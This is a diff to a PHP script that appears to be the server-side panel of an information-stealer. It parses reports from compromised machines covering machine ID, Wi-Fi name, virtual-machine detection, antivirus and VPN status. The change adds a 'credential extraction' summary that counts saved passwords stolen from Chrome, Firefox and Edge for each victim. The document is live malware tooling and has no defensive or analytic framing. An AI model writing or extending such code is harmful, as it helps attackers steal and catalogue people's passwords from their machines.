@@ -169,6 +169,8 @@ $wifi_ssid = '?';
 $vm_status = '?';
 $antivirus = '?';
 $vpn_status = '?';
+$cred_count = 0;
+$cred_browsers = [];
 
 if ($decoded_json) {
     $machine_id = isset($decoded_json['machine_id']) ? $decoded_json['machine_id'] : 'unknown';
@@ -186,6 +188,19 @@ if ($decoded_json) {
     $vm_status = isset($decoded_json['vm_detection']) ? implode('; ', $decoded_json['vm_detection']) : '?';
     $antivirus = isset($decoded_json['antivirus']) ? implode('; ', $decoded_json['antivirus']) : '?';
     $vpn_status = isset($decoded_json['vpn_proxy']) ? implode('; ', $decoded_json['vpn_proxy']) : '?';
+
+    // Credential extraction summary
+    if (isset($decoded_json['credentials'])) {
+        $creds = $decoded_json['credentials'];
+        $cred_summary = isset($creds['summary']) ? $creds['summary'] : [];
+        $chrome_count = isset($cred_summary['chrome_passwords']) ? $cred_summary['chrome_passwords'] : 0;
+        $firefox_count = isset($cred_summary['firefox_passwords']) ? $cred_summary['firefox_passwords'] : 0;
+        $edge_count = isset($cred_summary['edge_passwords']) ? $cred_summary['edge_passwords'] : 0;
+        $cred_count = $chrome_count + $firefox_count + $edge_count;
+        if ($chrome_count > 0) $cred_browsers[] = "Chrome({$chrome_count})";
+        if ($firefox_count > 0) $cred_browsers[] = "Firefox({$firefox_count})";
+        if ($edge_count > 0) $cred_browsers[] = "Edge({$edge_count})";
+    }
 }
 
 // Sanitize machine_id for filename
